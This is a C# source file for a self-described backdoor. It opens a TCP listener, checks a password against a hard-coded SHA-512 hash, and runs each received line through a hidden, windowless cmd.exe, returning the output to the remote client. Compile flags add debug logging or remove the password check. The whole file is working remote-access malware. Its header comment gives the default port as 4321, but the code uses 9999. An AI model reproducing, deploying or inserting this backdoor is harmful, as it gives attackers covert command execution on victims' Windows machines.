/*
Micah Martin - knif3

'csc backdoor.cs' or 'csc -define:DEBUG backdoor.cs' to compile

A simple backdoor to execute commands
the first argument will change the port number
If no arguments are specified, the default port is 4321
*/
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Security.Cryptography;

public class SynchronousSocketListener {
    public static string Hash(string password)
    {
        byte[] bytes = new UTF8Encoding().GetBytes(password);
        byte[] hashBytes;
        using (SHA512 algorithm = new SHA512Managed())
        {
            hashBytes = algorithm.ComputeHash(bytes);
        }
        return Convert.ToBase64String(hashBytes);
    }
    // Incoming data from the client.
    public static string data = null;

    public static void StartListening(int port) {
        bool auth = false;
        string pass = "ytGZEL1OyQq48Gh9YV88KZornGFT6R/Cs6FbroUHJHNPJ5jiVwoxdqvAb5E1SMIWGSxCLcHckvdyUo4QBQwAcg==";
        // Data buffer for incoming data.
        byte[] bytes = new Byte[1024];

        // Establish the local endpoint for the socket.
        // Dns.GetHostName returns the name of the 
        // host running the application.
        IPHostEntry ipHostInfo = Dns.Resolve(Dns.GetHostName());
        IPAddress ipAddress = ipHostInfo.AddressList[0];
        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);

        // Create a TCP/IP socket.
        Socket listener = new Socket(AddressFamily.InterNetwork,
            SocketType.Stream, ProtocolType.Tcp );

        // Bind the socket to the local endpoint and 
        // listen for incoming connections.
        try {
            listener.Bind(localEndPoint);
            listener.Listen(10);

            // Start listening for connections.
			#if DEBUG
				Console.WriteLine("[-] Listening on "+port+"...");
			#endif
            
            while (true) {
                // Program is suspended while waiting for an incoming connection.
                Socket handler = listener.Accept();
                data = null;
				#if DEBUG
					string rIP = ((IPEndPoint)(handler.RemoteEndPoint)).Address.ToString();
					Console.WriteLine("[+] Connected to ["+rIP+"]");
				#endif
                #if NOAUTH
                    auth = true;
                    handler.Send(Encoding.ASCII.GetBytes("Type KILL to kill the session and SHUTDOWN to stop the listener:\n"));
                #else
                    auth = false;
                #endif
				while (true)
				{
					if (auth)
                    {
                        handler.Send(Encoding.ASCII.GetBytes("# "));
                    } else {
                        handler.Send(Encoding.ASCII.GetBytes("Enter the password:\n"));
                    }
					// An incoming connection needs to be processed.
					while (true)
					{
						bytes = new byte[1024];
						int bytesRec = handler.Receive(bytes);
						data += Encoding.ASCII.GetString(bytes,0,bytesRec);
						if (data.IndexOf("\n") > -1) {
							break;
						}
					}
                    if (auth == false)
                    {
                        if (Hash(data) != pass)
                        {
                            goto Next;
                        } else {
                            auth = true;
                            #if DEBUG
                                Console.WriteLine("[+] Authenticated");
                            #endif
                            handler.Send(Encoding.ASCII.GetBytes("Type KILL to kill the session and SHUTDOWN to stop the listener:\n"));
                            data = null;
                            continue;
                            }
                    }
					if (data == "KILL\n")
					{
						goto Next;
					}
					if (data == "SHUTDOWN\n")
					{
						goto End;
					}
					data = data.Trim();
					string result = Exec(data);
					byte[] msg = Encoding.ASCII.GetBytes(result);
					handler.Send(msg);
					#if DEBUG
						Console.WriteLine("\t[+] Executing command ["+data+"]");
					#endif
					data = null;
				}
				
				End:
					handler.Shutdown(SocketShutdown.Both);
					handler.Close();
					break;
				Next:
					handler.Shutdown(SocketShutdown.Both);
					handler.Close();
					#if DEBUG
						Console.WriteLine("[-] Disconnected from ["+rIP+"]");
					#endif
					continue;
            }
		#pragma warning disable 0168
        } catch (Exception e) {
		#pragma warning restore 0168
			#if DEBUG
				Console.WriteLine(e.ToString());
			#endif
        }
		#if DEBUG
			Console.WriteLine("[+] Shutting Down");
		#endif

    }
	private static string Exec(string command)
	{
		
		System.Diagnostics.Process process = new System.Diagnostics.Process();
		System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
		startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
		startInfo.FileName = "cmd.exe";
		startInfo.Arguments = "/c "+command;
		startInfo.RedirectStandardOutput = true;
		startInfo.RedirectStandardError = true;
		startInfo.UseShellExecute = false;
		startInfo.CreateNoWindow = true;
		process.StartInfo = startInfo;
		
		string output = "";
		process.Start();
		while (!process.StandardOutput.EndOfStream)
		{
			string line = process.StandardOutput.ReadLine();
			output += line+"\n";
		}
		while (!process.StandardError.EndOfStream)
		{
			string line = process.StandardError.ReadLine();
			output += line+"\n";
		}
		return output;
	}

    public static int Main(String[] args) {
		int port = 9999;
		if (args.Length != 0)
		{
			try {
			port = Convert.ToInt32(args[0]);
			#pragma warning disable 0168
			} catch (Exception e) {
			#pragma warning restore 0168
				#if DEBUG
					Console.WriteLine("USAGE backdoor.exe [integer]");
				#endif
				return 1;
			}
		}
		StartListening(port);
        return 0;
    }
}